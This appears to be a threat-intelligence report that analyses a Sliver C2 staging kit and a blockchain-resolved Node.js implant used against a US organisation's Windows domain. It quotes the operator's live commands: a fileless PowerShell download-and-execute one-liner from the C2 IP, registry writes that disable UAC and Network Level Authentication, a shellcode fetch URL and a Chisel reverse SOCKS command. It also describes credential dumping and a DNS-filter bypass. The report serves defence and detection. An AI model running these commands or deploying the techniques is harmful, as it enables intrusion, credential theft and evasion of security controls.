---
title: Sliver C2 Windows Post-Exploitation Staging, 193.233.202.17
date: '2026-09-07'
layout: post
permalink: /reports/sliver-c2-windows-postex-staging-193-233-202-17/
hide: true
category: Post-Exploitation Toolkit
description: A Sliver C2 and a separate blockchain-resolved Node.js implant, staged from one open directory, reached Domain Admin in a US organisation's Windows estate; the second implant's C2 rotation is logged permanently and publicly on an Ethereum smart contract.
detection_page: /hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
ioc_feed: /ioc-feeds/sliver-c2-windows-postex-staging-193-233-202-17/
detection_sections:
  - label: "YARA Rules"
    anchor: "#yara-rules"
  - label: "Sigma Rules"
    anchor: "#sigma-rules"
  - label: "Suricata Signatures"
    anchor: "#suricata-signatures"
ioc_highlights:
  - value: "193[.]233[.]202[.]17"
    note: "Primary Sliver C2 and staging host"
  - value: "itemrange[.]com"
    note: "Current blockchain-resolved C2 domain"
  - value: "0xb3f2897f2bc797e5b9033faef8c81e92b01cb831"
    note: "Ethereum resolver contract, the campaign's most durable indicator"
  - value: "bd61c2880920bbfb86c12df439dd1ca0258a10e532433698fd029aef2a5b33f2"
    note: "svchost_update.exe, the Sliver beacon payload (SHA-256)"
thumbnail: /assets/images/cards/sliver-c2-windows-postex-staging-193-233-202-17.png
stix_bundle: /stix/sliver-c2-windows-postex-staging-193-233-202-17.json
---

**Campaign Identifier:** Sliver-C2-Windows-PostEx-Staging-193.233.202.17<br>
**Last Updated:** September 7, 2026<br>
**Threat Level:** HIGH

---

## BLUF (Bottom Line Up Front)
{: .hl-tier-1}

An open directory on `193.233.202.17` held a complete Windows post-exploitation kit built around a Sliver command-and-control beacon, together with a second and entirely separate implant that reads its C2 address out of an Ethereum smart contract. The operator reached a Windows Active Directory estate at one US organisation, created a Domain Admin account by script, disabled endpoint protection by product-specific service name, and subverted the victim's own DNS content filter through its administrative API so their C2 domain would resolve and pass the filter.

The most useful thing I can say about this actor is where they spent their effort. Everything that gets them onto a host and elevates them is public tooling used stock. Everything bespoke is knowledge of one specific network. They did not build a better exploit, they built better knowledge of one estate.

> Huntress saw this address first, on 2026-05-21, inside a confirmed ransomware incident of their own, and that first-party incident telemetry is the single strongest piece of evidence in this report's attribution section. Hunt.io then published the full investigation on 2026-08-04, covering the same address, the same resolver contract and the same five C2 domains, with eleven file hashes matching this corpus byte for byte. No IP, domain, contract identifier or file hash recovered here is a first public observation. This report builds on both and credits them; what it adds is the internal-network tradecraft, the code-level reverse engineering, the on-chain funding chain and the victim-side picture, none of which had been published.

> Confidence levels appear throughout, and they distinguish what the recovered files establish from what I am inferring. The distinction that governs the whole script layer is that the scripts prove the operator prepared these commands and knew this network, not that every command ran or succeeded.

---

## 1. Executive Summary
{: .hl-tier-1}

The operator got into a Windows domain, took Domain Admin, and then spent their time making sure they could stay and could reach the rest of the estate. That is the short answer to what they did inside the network, and every part of it is scripted rather than improvised.

They created an Active Directory account with a non-expiring password and added it straight to Domain Admins. They created a second local administrator, put it in both the Administrators and Remote Desktop Users groups, then enabled RDP and turned off Network Level Authentication. They stopped and disabled eight services belonging to one commercial endpoint-protection product, by name, and had the script report each service's state back so they would know whether it worked. They saved the SAM, SYSTEM and SECURITY registry hives to disk and uploaded all three over HTTP to their own server for offline cracking, which is a third credential route running alongside an LSASS minidump and a copy of mimikatz.

The standout piece of tradecraft is the DNS filter bypass, and it is the clearest evidence of how well they understood this particular environment. Three scripts drive the victim's commercial DNS content filter through its own administrative API. One of them logs in, downloads the appliance's client-side JavaScript, and runs a regular expression over it to discover the product's API endpoint names from its own front-end code rather than guessing at paths. Then it whitelists the operator's domain. Four further scripts plant a matching A record into the victim's AD-integrated DNS zone, pointing inward at the filtering appliance itself. The whitelist entry and the DNS record are one mechanism rather than two, because the record makes the name resolve internally and the whitelist makes the filter permit it.

That whitelisted domain, `publisherresolution.com`, is also the first value ever written to the Ethereum resolver contract used by the second implant. That single fact is what proves the Sliver strand and the blockchain strand are one operation rather than two tools that happened to share a directory.

### What the operator built, and what they bought

The split is clean, and it is the part of this case I would carry into the next one. Everything used for access and elevation is public and unmodified, meaning mimikatz at full public capability, JuicyPotato from 2018, PrintSpoofer from 2020, GodPotato, EfsPotato, Chisel and Ligolo-ng. Exactly one compiled artifact was modified, `svcload.exe`, a PrintSpoofer derivative whose console diagnostics have been removed and whose signature-bearing strings are constructed on the stack at runtime rather than sitting in the binary as literals.

Everything bespoke is environment knowledge. The DNS filter subversion, the AD DNS record plant, the per-host build convention, the eighteen-host deployment list, the endpoint protection disabled by product-specific service name. The Node.js strand is the one exception on the tooling side and it is genuinely engineered, resolving its C2 by majority vote across seven public Ethereum RPC providers so that a single hostile provider cannot redirect it.

I read that split as effort allocation rather than as a single sophistication dial, and it is worth reading that way because the two halves point in opposite directions. Rebuilding a public privilege-escalation technique to be quieter is a deliberate detection-evasion decision that an off-the-shelf assembler does not make. Choosing PrintSpoofer at all, a well-worn and heavily signatured 2020-era technique, in a period when fresh exploitable vulnerabilities are plentiful, is conservative. The reading that fits both without straining is a competent operator optimising for reliability over novelty, spending effort where it keeps them alive and refusing to spend it where novelty would only add risk.

### The blockchain resolver, and why it works against them

The second implant arrives as an MSI, brings its own Node.js runtime by downloading the genuine signed distribution from `nodejs.org`, and runs everything after that point as JavaScript inside a legitimate `node.exe`. That sidesteps PowerShell script-block logging, AMSI and Constrained Language Mode entirely, because none of those instrument Node. It then resolves its C2 by reading an Ethereum smart contract, and on first run it posts its own source back to the server to be re-obfuscated, so no two victims run a hash-matchable copy.

They chose a blockchain for takedown resistance and got it. Nobody can seize the contract, nobody can overwrite the operator's entry because the setter writes to a mapping keyed by sender, and there is no takedown lever in the design at all. In exchange they published a permanent, publicly readable log of every C2 they have ever set, queryable by their own targets without touching their infrastructure and without them being able to tell anyone is looking. A defender tracking domains would have lost this operation five times in five months. The contract address never changed once.

That is the defensive recommendation this case actually produces. Monitoring the contract returns the operator's next C2 the moment they set it, ahead of any feed.

### Attribution, in one paragraph

I cannot attribute this to a named threat actor. The infrastructure served a confirmed ransomware deployment by a criminal group known as The Gentlemen, but whether the operator I tracked pulled that trigger themselves or handed access to someone who did is something the evidence cannot settle. I am tracking the intrusion set as **UTA-2026-024** *(an internal tracking label used by The Hunters Ledger, see Section 11)*. The full assessment decomposes into four separate questions carrying four different confidence levels, and collapsing them into one label would misrepresent all four.

### What a defender should do first

If I were hunting this from the victim side, I would start with the two things closest to unfakeable for this specific intrusion rather than with generic Sliver or mimikatz signatures, which only tell you that something is present without telling you it is this. Those are a service account created outside normal provisioning and added straight to Domain Admins, and a weekly scheduled task disguised as a software archiver job whose action is a fileless `iex((New-Object Net.WebClient).DownloadString(...))` that re-pulls the full attack chain from the C2 on every run.

For the campaign rather than the intrusion, poll the resolver contract.

---

## 2. What Is Already Public, and What This Report Adds
{: .hl-tier-1}

This infrastructure was not found first here, and saying so plainly is the honest frame for everything that follows.

Huntress got there first, on 2026-05-21, and theirs is the contribution this report leans on hardest. They observed `193.233.202.17` acting as scheduled-task command and control inside a confirmed ransomware incident of their own, complete with a signatured encryptor and the group's ransom note. That is first-party SOC telemetry rather than an inference drawn from someone else's write-up, and it is the reason the ransomware association in Section 11 holds at all. The sensitivity check there is blunt about it, because removing that one piece of evidence collapses the association outright.

They published no file hash for the binary they saw, so nothing here rests on a hash comparison against their work. That is a difference in evidence type rather than a difference in strength, and on the question that matters most in this case their evidence is the stronger of the two.

Hunt.io published the full investigation on 2026-08-04, covering the same address, the same resolver contract and the same five historical C2 domains, and their eleven published file hashes match the files captured here byte for byte. That hash-level match is what establishes this corpus and theirs are the same artifacts, which is the other thing this report needs from the published record and could not have supplied for itself.

So none of the infrastructure in this report is a first observation, and no file hash is either. Two things in the technical record do appear to be genuinely unreported, on a targeted search that found no public coverage of either. The first is the per-target Go reverse-shell build convention, where roughly two dozen minimal Go programs each carry one hardcoded `host:port` and their own build identifier. The second is the combination of DNS-filter whitelisting, AD-integrated DNS record planting and per-host scheduled tasks, worked as one mechanism against one estate.

The larger gap is not about novelty of technique at all, it is about coverage. The published work stops at the perimeter. Nobody has published anything on what the operator did inside the victim network, on the registrant and burner-persona discipline behind the rotating domains, on the complete on-chain enumeration that proves the rotation history is a full record rather than a sample, or on the funding trace behind the wallet that controls the contract. Neither published account carries detection rules of any kind.

That is the shape of what follows. Where I describe an artifact that is already public, I describe what the artifact is and what it does, and I do not dress it up as a discovery.

Three separate sets of people looked at this same infrastructure in turn, and each of them decided to publish what they found. Analysts at Huntress saw it first, on 2026-05-21, from inside a live incident on a network they were defending, and they wrote it up rather than closing the ticket. More than two months later researchers at Hunt.io ran the full investigation and published it with file hashes, which was a choice rather than a formality, because hashes are what let a stranger like me confirm that their artifacts and mine are the same files instead of asking anyone to take my word for it. By the time I opened this directory both of those were already done, so I could spend my time inside the victim network instead of re-establishing the perimeter picture. What that bought is the victim-side tradecraft, the code-level reverse engineering, the implant's own observed behaviour, the funding chain behind the wallet, and a set of measured negatives that tell you which indicators are not worth your time.

Add those together and anyone defending a network against this operator has three layers to work with instead of one. They got an incident-grounded warning in May, a verifiable infrastructure picture in August, and now the inside of the intrusion with detection rules they can deploy. Not one of the three of us could have produced that alone, and none of us coordinated with the others to make it happen. That is this kind of work at its most powerful, and it is a win worth celebrating.

It does not stop here either. Three things in this report are open, and someone else is better placed to close them than I am. Whether the repeated registrant city is this operator's fingerprint or a commodity tool's default needs a reverse-WHOIS I cannot run. The four unreferenced constant-returning functions in the resolver contract match nothing in any public signature database I have checked, and whoever recognises them recognises the builder. And whether the wallet controlling the contract belongs to the operator or to a broker serving several is put out of reach by the permissionless setter, which is a design property rather than a gap in my access.

If any of those is yours to answer, please take it. My congratulations to the people at Huntress and at Hunt.io who did the work this report is built on, and the best outcome for this one is that somebody does the same to it.

---

## 3. Business Risk Assessment
{: .hl-tier-1}

I rate this **8.1 out of 10, HIGH**. The staged capability set is a complete pre-ransomware kill chain against a Windows domain, with credential access, privilege escalation, lateral movement and two independent command-and-control channels all present and all built for a real environment.

<table>
<colgroup>
<col style="width: 30%;">
<col style="width: 14%;">
<col style="width: 56%;">
</colgroup>
<thead>
<tr><th>Risk Dimension</th><th>Score (X/10)</th><th>Rationale</th></tr>
</thead>
<tbody>
<tr><td>Data Exfiltration</td><td>8/10</td><td>Three independent credential-access routes, with the SAM, SYSTEM and SECURITY hives uploaded over HTTP for offline cracking. The Node.js strand executes arbitrary JavaScript with the full Node API, so there is no fixed command set bounding what it can read or send.</td></tr>
<tr><td>System Compromise</td><td>9/10</td><td>Domain Admin created by script, SYSTEM-level scheduled tasks, a Sliver beacon carrying process migration and file upload, and a second implant with unbounded remote code execution in the user context.</td></tr>
<tr><td>Persistence Difficulty</td><td>7/10</td><td>Multiple independent mechanisms rather than one. A weekly SYSTEM task that re-pulls its payload fresh from the C2, a Run key launching a headless Node process, forged task authors, one task backdated to 2019 to blend in, and a Domain Admin account that survives host rebuilds entirely. No bootkit or firmware persistence, which is what holds this below 9.</td></tr>
<tr><td>Evasion Capability</td><td>8/10</td><td>Second-stage code runs inside a signed Node runtime, outside PowerShell logging, AMSI and Constrained Language Mode. Server-side per-victim re-obfuscation defeats hash matching by design. Shellcode is written read-write then flipped to read-execute rather than allocated read-write-execute. Endpoint protection is disabled by service name and the DNS filter is subverted through its own API.</td></tr>
<tr><td>Lateral Movement</td><td>9/10</td><td>SMB admin shares, WMI process creation, WinRM, remote scheduled tasks, RDP with Network Level Authentication disabled, Chisel reverse SOCKS and Ligolo-ng tunnelling. The deployment scripts enumerate eighteen internal hosts and fall back across three transfer mechanisms so one blocked path does not stop deployment.</td></tr>
<tr><td>Detection Challenge</td><td>7/10</td><td>Split. The blockchain resolver is genuinely resistant to takedown and the Node.js bot cannot be caught by hash across victims. Set against that, the Sliver beacon runs on a perfectly periodic sixty-second interval with no jitter at all, which is trivially detectable by anyone doing beacon analysis.</td></tr>
</tbody>
</table>

### Why HIGH and not CRITICAL

No encryptor, wiper or recovery-inhibition artifact is present anywhere in the captured corpus, so Impact is unevidenced from what was recovered. Every known Go beacon listener port on all three operator addresses was closed when probed, which makes that strand historical rather than live.

Set against those, the blockchain-resolved strand was still configured and was rotated as recently as 2026-07-01, ten weeks after this directory was captured. That last point matters more than it looks. The implant recovered here was staged in April and cannot have shipped with a domain registered in July, so it reaches its current C2 only because the operator updated the contract after capture. That is direct proof the infrastructure was being maintained.

It is proof of maintenance rather than proof of current victims, and I want to be exact about the difference. A contract returning a URL and a domain resolving tell you the infrastructure is being kept alive. Neither tells you anyone is currently compromised. My confidence that this campaign is presently operating against live victims is **INSUFFICIENT**, and it stays there until something observes a victim rather than an asset.

### Who was affected

One US-based organisation, externally validated. The intrusion reached an internal Windows Active Directory estate, and the operator's own scripts name that estate's subnets, its host octets, its internal asset-tag convention, its file server, its endpoint-security product and its DNS-filtering appliance.

The organisation is not named here, and neither are its domain, its hostnames, the accounts the operator created, the credentials recovered, or any internal address. Those are held in the investigation's evidence record because that is what an evidence record is for. Detection guidance in Section 13 is written behaviourally for exactly this reason.

One detail from the deployment scripts is worth reading as targeting rather than as inventory. The privilege-escalation chain carries MS16-032, a 2016 vulnerability, as one of three fallbacks alongside modern Go tradecraft. Whoever wrote it expected to still find unpatched Server 2012-era hosts on this network.

---

## 4. Technical Classification
{: .hl-tier-2}

| Field | Assessment |
|---|---|
| **Type** | Multi-family Windows post-exploitation staging kit. C2 beacon, reverse shells, privilege-escalation suite, credential theft, tunnelling, and a JavaScript execution harness |
| **Primary family** | **Sliver** (BishopFox), running in **beacon** mode rather than as an interactive session implant |
| **Family confidence** | **DEFINITE**, on direct evidence at two independent levels |
| **Second family** | EtherRAT-class Node.js implant with an on-chain C2 resolver, delivered by MSI |
| **Second family confidence** | **HIGH** on the technique class and the contract lineage. This specific build is not byte-matched to any published sample |
| **Bundled commodity tooling** | mimikatz, JuicyPotato, PrintSpoofer, GodPotato, EfsPotato, Chisel v1.11.5, Ligolo-ng |
| **Operator-authored** | About 24 minimal Go TCP reverse shells with one hardcoded `host:port` each, one quieted PrintSpoofer derivative, and roughly 30 environment-specific scripts |
| **Sliver version** | **Unrecovered.** Stripped by symbol obfuscation and absent from process memory |
| **Corpus** | 81 files captured from the open directory, 77 of them triaged individually |
| **First seen** | Directory crawled 2026-04-22 and 2026-04-24. The only genuine operator build timestamp is 2026-04-16 18:50:14 UTC. The resolver contract was deployed 2026-03-31 13:49:11 UTC |
| **Threat level** | **HIGH** (8.1/10) |

Sliver is DEFINITE rather than inferred, and the two levels of evidence are worth stating because every earlier call on this case rested on third-party verdicts. The canonical upstream import path `github.com/bishopfox/sliver/protobuf/sliverpb` was recovered live from the running process, which is the implant naming its own framework while it executes. Surviving protobuf getters also remain in the binary despite symbol obfuscation having mangled 273 of 282 package roots.

The kit was authored and staged on a Linux host, which I rate HIGH on three converging signals rather than three independent proofs. Twenty-eight of the thirty text files use LF line endings, which Windows-native editing does not produce, and the two surviving CRLF files prove no normalisation happened during collection, so the LF majority is genuine operator behaviour. The six empty directories in the crawl are `.ICE-unix/`, `.X11-unix/`, `.XIM-unix/`, `.font-unix/` and two `systemd-private-*` entries, which are the canonical contents of `/tmp` on a systemd Linux host. The operator did not build a web directory at all, they pointed an HTTP server at `/tmp` on their staging box and exposed whatever happened to be in it, which is also why there is no index page, no README and no configuration file. Every operator source path recovered from the binaries sits under `/tmp`, and `chisel.exe` is not a Windows PE at all but a Linux ELF built `GOOS=linux`.

---

## 5. What the Operator Did Inside the Network
{: .hl-tier-2}

Everything in this section is **staged capability**. The scripts prove the operator prepared these commands and knew this environment in detail. They do not prove that every command ran, reached every listed host, or succeeded. I hold that distinction throughout because it is the one most easily lost between an evidence record and a report.

Two things in this campaign are observed rather than staged, and they carry more weight accordingly. The beacon's own network behaviour is observed. The contract's write history is observed on a public immutable ledger, which is the strongest evidence class in the case because nobody can retroactively edit it, the operator included.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/sliver-c2-windows-postex-staging-193-233-202-17/sliver-c2-internal-killchain.svg" | relative_url }}" alt="Vertical four-stage infographic titled The Internal Kill Chain. Stage 1, orange band, Study the Environment, Bypass the DNS Filter: three scripts perform reconnaissance then drive the victim's DNS filtering appliance through its own admin API, using the jaction=getWhitelist and addwhitelist calls, and a planted Active Directory DNS record makes the operator's own name resolve inward; detection hint notes Add-DnsServerResourceRecordA planting an unfamiliar name. Stage 2, yellow band, Six Persistence Mechanisms, One Fileless Re-Pull: scheduled tasks forge their Author field and run hidden as SYSTEM, with one task's action shown as a DownloadString one-liner pulling task_39.ps1 from the operator's C2 on port 42718 via iex, re-pulling the full attack chain weekly rather than executing a static payload; detection hint notes a scheduled task whose action is a DownloadString one-liner. Stage 3, red band, Domain Admin, Then Three Routes to Credentials: a new account is created and added directly to Domain Admins by script, and credentials are harvested through an LSASS minidump, a copy of mimikatz, and the SAM, SYSTEM and SECURITY hives uploaded over HTTP, while EnableLUA and Network Level Authentication are both disabled; detection hint notes a handle opened on lsass.exe followed by a large write to the Temp directory. Stage 4, deep red band, Mass Deployment Across an Eighteen-Host Fleet: seven scripts reuse the same domain backdoor account over net use, falling back across certutil, xcopy and WMI process creation so one blocked transfer path does not stop the deployment; detection hint notes wmic /node invoking certutil against an admin share. Footer notes this is staged capability throughout, proven by the operator's own scripts but not confirmed as executed on every host, plus a color legend.">
  <figcaption><em>Figure 1: The four stages the operator's own scripts prove were prepared inside the victim network, from studying and defeating a commercial DNS filter through to a scripted, self-healing deployment across eighteen hosts. Every stage reuses the same domain backdoor account created in Stage 3.</em></figcaption>
</figure>

### The DNS filter bypass

This is the piece I keep coming back to, because it is the clearest evidence that the operator had studied this specific environment rather than run a playbook at it.

The victim ran a commercial DNS content filter. Three operator scripts drive that appliance through its own administrative interface. The first is reconnaissance, probing the appliance's PostgreSQL backend on TCP 5432, confirming the admin login by a second method, and grepping a support page for API action names and whitelist keywords. The second logs in with a hardcoded appliance admin credential, probes the filtering, policy, whitelist and setup pages, then posts an `addwhitelist` action for the operator's own domain through the policy page's JSON API.

The third is the interesting one. After logging in, it downloads the appliance's own client-side JavaScript asset and runs a regular expression over it to extract every API endpoint name the product uses, discovering the interface from the vendor's front-end code rather than guessing at paths. Then it calls the support endpoint with `jaction=getWhitelist` to read the whitelist back and confirm the change took.

Four further scripts plant an A record for the same name into the victim's AD-integrated DNS zone through `Add-DnsServerResourceRecordA`, pointing inward at the filtering appliance rather than at attacker infrastructure. One of them runs the command remotely over WinRM against the DNS server, and the whitelist script falls back to that remote path if the local one fails. Read the DNS record and the whitelist entry as one mechanism rather than two, because the record is what makes the name resolve inside the network and the whitelist is what makes the filter permit it.

### Persistence, and the one that matters most

Six scheduled-task definitions all forge their `<Author>` field to a domain administrator, run as SYSTEM under `S-1-5-18`, and set `Hidden=true`. Their registration dates split between 2026-04-16, which matches the genuine operator build timestamp, and a backdated 2019-06-11 chosen to sit unremarkably among genuinely old tasks. One carries a 72-hour execution limit, which suggests a long-running beacon process rather than a quick job.

The capstone is a weekly task disguised under a plausible internal business-application description, and the operator did not reuse a single cover story across the task set. Two different descriptions appear, both impersonating the same business-application product line rather than repeating one string. That is a small extra effort, and it sits alongside the backdated registration and the forged authors as the same environment-blending instinct.

Its action is a single line:

```
powershell -ep bypass -w hidden -NonInteractive -c iex((New-Object Net.WebClient).DownloadString('http://193.233.202.17:42718/task_39.ps1'))
```

That is a fileless download-and-execute of the full attack chain, re-pulled fresh from the C2 on every run rather than executing a static payload. It is a materially different persistence property from a dropped binary, because whatever the operator changes on their server ships to every persisted host at the next weekly trigger. A defender who removes the payload but leaves the task has removed nothing.

### The rest of the script layer

<details markdown="1" class="hl-teardown">
<summary>Account creation, credential collection, enumeration, injection and the eighteen-host deployment fleet, script by script</summary>

The account work starts with a script that binds to the victim's AD domain by name through `DirectoryContext` and `GetDomain`, creates an account with a hardcoded password, sets `userAccountControl` to 66048 (`NORMAL_ACCOUNT` plus `DONT_EXPIRE_PASSWORD`) and adds it directly to Domain Admins, echoing `USER_CREATED_OK` and `ADDED_TO_DA_OK` as success markers. The capstone script creates a second local account, adds it to both Administrators and Remote Desktop Users, and separately attempts to add it at domain level. A third credential set appears in one deployment script, a local Administrator password of unclear origin that is plausibly cracked from the same hives this kit collects.

Three registry writes then weaken the host's own controls:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

The third is passed as an argument to `GodPotato.Program.Main` by the reflective loaders, so that write executes at SYSTEM from inside an injected assembly rather than from a script an EDR would see.

Two more writes enable RDP and disable Network Level Authentication:

```
reg add 'HKLM\System\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add 'HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' /v UserAuthentication /t REG_DWORD /d 0 /f
```

Disabling Network Level Authentication is the choice worth noticing. It widens the pre-authentication attack surface on every host it touches, and the operator does not need it for their own access. They took a step that makes the victim more exposed to everyone else in exchange for nothing.

The capstone script disables endpoint security by name, stopping eight services that belong to one commercial endpoint-protection product, then reports each service's resulting state back over the reverse shell so the operator learns whether the attempt worked rather than assuming it did.

Credential collection runs down three independent routes. One script opens a handle on `lsass` and calls `MiniDumpWriteDump` to `C:\Windows\Temp\ls.dmp`, reporting `DUMP_OK:<size>` or `DUMP_FAIL`. A copy of mimikatz is the direct route. And the capstone script runs the classic offline-crackable trio, saving `HKLM\SAM`, `HKLM\SYSTEM` and `HKLM\SECURITY` to `C:\ProgramData` as `.bak` files, then HTTP PUTs each one to `/upload_<name>` on port 42718 of the operator's own host.

Three enumeration scripts are three iterations of one technique. Each steals a logged-on user's token through `WTSQueryUserToken` and `ImpersonateLoggedOnUser`, using P/Invoke C# injected with `Add-Type`, then under that identity enumerates all non-disabled AD users through `DirectorySearcher`, lists cached Kerberos tickets with `klist`, and probes SMB reachability of the `ADMIN$` and `C$` shares. The iterations grow. The first pulls `sAMAccountName`, `badPwdCount` and `lockoutTime`; the second adds `memberOf`; the third adds `adminCount` and `userAccountControl`. That `adminCount` filter is explicit hunting for current or former privileged accounts.

Three shellcode injection scripts all use `VirtualAlloc` at read-write, then `Marshal.Copy`, then `VirtualProtect` to read-execute, then `CreateThread`. Writing then flipping rather than allocating read-write-execute outright is mild but real EDR awareness. One pulls its shellcode from `http://193.233.202.17:8088/slv_beacon_sc.bin` and explicitly sets `GlobalProxySelection.GetEmptyWebProxy()` to bypass any configured corporate proxy before downloading.

The other two read the same payload over SMB from the victim's own internal file server. That is the most under-appreciated mechanism in the whole kit, because it means the operator staged their implant shellcode on compromised infrastructure and pulled it back down from inside. A defender watching for external downloads sees an internal file read.

Reflective .NET loading gets a 560-byte script that downloads a base64 blob, decodes it and loads it in memory through `[System.Reflection.Assembly]::Load()`, never touching disk, then invokes `GodPotato.Program.Main`. A sibling script is the pre-staged variant that reads the same blob from local disk instead.

The privilege-escalation chain bundles three techniques as fallbacks in one script, MS16-032 (CVE-2016-0099, the Secondary Logon handle race, named in the script's own comment), a Print Spooler restart named-pipe impersonation trick, and a `whoami /priv` fallback. On success it launches a netcat copy from `C:\ProgramData` against port 43156.

Seven scripts drive mass deployment against an eighteen-host internal fleet on a single subnet, all reusing the same domain backdoor credential over `net use`.

| Script class | Mechanism | Task name |
|---|---|---|
| `deploy_all.bat` | `certutil -urlcache -split -f` from port 42099 into an admin share | `WindowsUpdateSvc` |
| `dep3/4/8.bat`, byte-identical | `xcopy` a locally staged executable to 17 hosts | `WindowsUpdSvc31` |
| `dep.ps1` | `Copy-Item` with an explicit `PSCredential` object | `WindowsUpdSvc31` |
| `dep2.ps1` | PowerShell equivalent through a mapped drive | `WindowsUpdSvc31` |
| `deploy2.cmd` | 10-host subset, `certutil` then `msiexec /i ... /quiet /norestart` from port 39287 | `WinSvcUpdate2` |
| `deploy.cmd` | SMB copy first, falling back to `wmic /node:<host> process call create` invoking certutil; MSI served from port 44321 | `WinSvcUpdate2` |
| `run_chisel.bat` | Chisel client as `client 193.233.202.17:22673 R:socks`, a reverse SOCKS proxy with the binary disguised as a service | none |

Every deployment task runs `/sc ONSTART` or `/sc once` as SYSTEM, deletes any existing task of the same name before recreating it, and triggers immediately with `schtasks /run`. The fallback chain is the part worth carrying, because a single blocked transfer path does not stop the deployment.

Remote task deployment rides on a base64-encoded batch script, 387 bytes once decoded, that creates and immediately runs a SYSTEM scheduled task named `SysUpdate` on a named victim workstation, executing an MSI from a path shaped like a legitimate internal AD software-deployment share. The operator piggybacked a real internal deployment mechanism rather than inventing one. Whether that MSI is the same package analysed in Section 6 under a different name is **NOT ESTABLISHED**, because the path is inside the victim network and the file was never recovered.

</details>

---

## 6. The Two C2 Strands, and What Ties Them Together
{: .hl-tier-2}

The kit runs two command-and-control channels that share almost nothing technically. One is a Sliver beacon talking to a raw IP address. The other is a Node.js implant that asks a public blockchain where to report. They look like two separate operations that happened to be staged in the same directory, and for a while I treated them that way.

They are one operation, and a single fact settles it. The first value ever written to the resolver contract is `publisherresolution.com`, which is the same domain the operator whitelisted through the victim's DNS-filtering appliance and planted as an internal AD DNS record. The strand that never touches a blockchain went to considerable trouble to make the blockchain strand's first C2 domain resolve and pass filtering inside the victim's network.

### The Node.js implant, and its bring-your-own-runtime bootstrap

The delivery package is a 26,624-byte MSI whose filename suggested a Sliver console installer and which is nothing of the kind. Its internal identity is randomised gibberish throughout, ProductName, Manufacturer, registry paths and all, which is the fingerprint of an automated builder that randomises human-facing strings per build to break signature matching. It carries anti-forensic actions that remove its own temporary files and directory on completion.

One identifier in that package cannot be randomised. MSI semantics require the **UpgradeCode** to stay constant across versions of the same product, which makes `{B3D67F25-0E3A-4B6B-965C-2C7610958983}` the only pivot candidate the installer offers. Its prevalence across unrelated samples has not been measured, so I record it as **NOT CHECKED** as a cross-campaign link rather than as a weak one. An unmeasured shared artifact is not a small positive, it is an unjudged claim, and this publication has already had to retract one indicator for exactly that mistake.

<details markdown="1" class="hl-teardown">
<summary>The three-stage chain, from runtime bootstrap through the XOR-with-counter decryptor to the AsyncFunction execution harness</summary>

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/sliver-c2-windows-postex-staging-193-233-202-17/sliver-c2-etherhiding-bootstrap-chain.svg" | relative_url }}" alt="Vertical four-step infographic titled The EtherHiding Bootstrap Chain. Step 1, orange band, Bring Your Own Runtime: a 546-byte bootstrapper checks for Node, then fetches the genuine nodejs.org runtime zip; curl.exe and tar.exe, both signed Microsoft binaries, unpack it; detection hint notes node.exe launched from a script rather than a browser. Step 2, red band, Decrypt and Persist: 840 bytes of JavaScript apply XOR with a 64-byte key combined with a position counter, shown as the formula o[i] = e[i] xor k[i mod k.length] xor (i and 255); persistence is a Run key launching node.exe with conhost --headless; detection hint notes node.exe running from %LOCALAPPDATA% under a headless Run key. Step 3, yellow band, Resolve C2 by Majority Vote: an eth_call using selector 0x7d434425 is sent to seven public Ethereum RPC providers in parallel, and the bot takes a majority vote across the responses so one hostile or misconfigured provider cannot redirect it; detection hint notes an outbound eth_call from a non-developer, non-browser process. Step 4, deep red band, Execute Whatever Comes Back: any response over ten bytes is run as an AsyncFunction built through Object.getPrototypeOf(async function(){}).constructor, giving the returned code the full Node API; detection hints note a POST to a static-asset-shaped path with a single-letter query key, and that the server re-obfuscates the bot's own source on first run so no two victims share a hash-matchable copy. Footer lists the detection anchors and a color legend.">
  <figcaption><em>Figure 2: The four-stage chain that turns a signed Node.js runtime into the attacker's interpreter, from the initial download through the blockchain-resolved majority vote to arbitrary code execution. The detection value sits in the first and last stages, since the middle two produce no fixed indicator to hunt on.</em></figcaption>
</figure>

Stage 1 brings its own runtime. A 546-byte bootstrapper checks whether Node is present and, if not, downloads the genuine `https://nodejs.org/dist/v18.17.0/node-v18.17.0-win-x64.zip`, unpacks it with the built-in `tar.exe`, renames the folder and launches the payload. Both `curl.exe` and `tar.exe` are signed Microsoft binaries and the runtime is a signed vendor build, so the entire bootstrap runs on trusted components.

Everything after that point executes as JavaScript inside a legitimate `node.exe`, which steps outside PowerShell script-block logging, AMSI and Constrained Language Mode completely, because none of those instrument Node. That is the single most consequential design decision in the package, and it is worth separating from the obfuscation around it. Obfuscation makes code harder to read. Changing interpreter makes the defender's instrumentation irrelevant.

The `nodejs.org` download is not an indicator and blocking it would be wrong. It is the genuine vendor artifact. The detectable behaviour is `node.exe` running from `%LOCALAPPDATA%` under a `conhost --headless` Run key.

Stage 2 decrypts and persists. 840 bytes of JavaScript apply XOR with a 64-byte repeating key combined with a position counter, `o[i] = e[i] ^ k[i % k.length] ^ (i & 255)`. That counter term is the part worth understanding, because it defeats naive repeating-XOR key recovery. Identical plaintext bytes no longer produce identical ciphertext at the same key offset, so the usual frequency approach against a repeating key finds nothing. Strings are hidden behind base64 and concatenation, so `child_process` is written as `"child_pr"+"ocess"`.

Persistence is a single Run value:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    WindowsHost = conhost --headless "<node.exe>" "<installdir>\BDQbS2lZ6u.bak"
```

`conhost --headless` launches the child with no console window at all, which is quieter than `windowsHide` or `-WindowStyle Hidden` and considerably less commonly hunted for.

Stage 3 is a generic execution harness. It requires only `crypto`, `fs`, `os` and `path`, and its configuration block holds a build id, the resolver contract address, the address passed as the getter argument, a flag enabling blockchain resolution, seven public Ethereum RPC endpoints, and a `http://localhost:3000` fallback that is plainly a development leftover.

